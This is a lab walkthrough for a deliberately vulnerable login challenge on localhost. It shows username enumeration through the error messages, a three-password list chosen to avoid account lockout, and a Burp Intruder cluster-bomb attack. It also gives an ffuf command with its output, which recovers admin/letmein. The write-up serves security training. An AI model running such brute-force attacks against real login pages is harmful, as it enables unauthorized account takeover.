# Challange

**Warning: Accounts will lock after 5 failed login attempts!**

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/b3ff9277-78ad-4c7c-ae16-a126eecc4133)

- On trying a random username and password we got 1 incorrect login attempt.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/23adffeb-86ab-4814-bf83-91bfa4596b76)

- While submitting another random username and password we revert nothing, so here is the indication that the admin user exists.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/b0f9f36f-0ab9-4b56-85b4-dd1ef2706f6c)

- We will make a list of the top 3 most used passwords to not let the accounts lock.
  - Passwords: letmein, 123456, teashop
- Next, we will intercept the request and send it to the intruder.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/c9fcb255-45fd-49a3-af50-5efb8267a5f9)

- Next, we will use the attack method as cluster bomb load the username list and the top 3 passwords.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/74543637-791e-42bf-bc33-01fa0e4504f6)

- After clicking on start attack we have got the user `admin` and password `letmein`.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/91ef9bae-11d9-42c9-ac3b-9b82247ad6b5)

- On entering the details of user admin and password letmein. We have successfully logged in.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/774a4798-18b1-4a3a-9ae1-f7e01671af4b)
![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/7cffb1c4-e28d-4f68-9e56-24b57d296415)

## Alternate:

- We can use the tool called ffuf,wffuf, and hydra to achieve the same. This time let's use ffuf.
- For using ffuf we need to copy the request and save it to a file in the local machine.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/2142ecd3-01e8-4267-a66c-4a72ed2ee44d)

- On saving the request to the file, we need to do some modifications to the file by defining the arguments to get suitable results.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/a51e953e-82e0-4605-930a-72672b12ae28)

- Make a file of the top 3 passwords.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/642dd3ce-17c9-4c42-93b4-b83c2c84eea7)

- By using the command: `ffuf -request reqs.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/usernames-shortlist.txt:FUZZUSER -fs 3376,3256`

```bash
└─$ ffuf -request reqs.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/wordlists/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376,3256

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/labs/a0x03.php
 :: Wordlist         : FUZZPASS: /home/singhx/labs/PEH/XSS/pass.txt
 :: Wordlist         : FUZZUSER: /usr/share/wordlists/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Connection: close
 :: Header           : Cookie: PHPSESSID=bcbc6597490163fa9ed394d5f5145dcd
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Host: localhost
 :: Header           : Origin: http://localhost
 :: Header           : Referer: http://localhost/labs/a0x03.php
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZUSER&password=FUZZPASS
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 3376,3256
________________________________________________

[Status: 200, Size: 3378, Words: 1270, Lines: 68, Duration: 3ms]
    * FUZZPASS: letmein
    * FUZZUSER: admin

:: Progress: [51/51] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
- Got the same credentials.
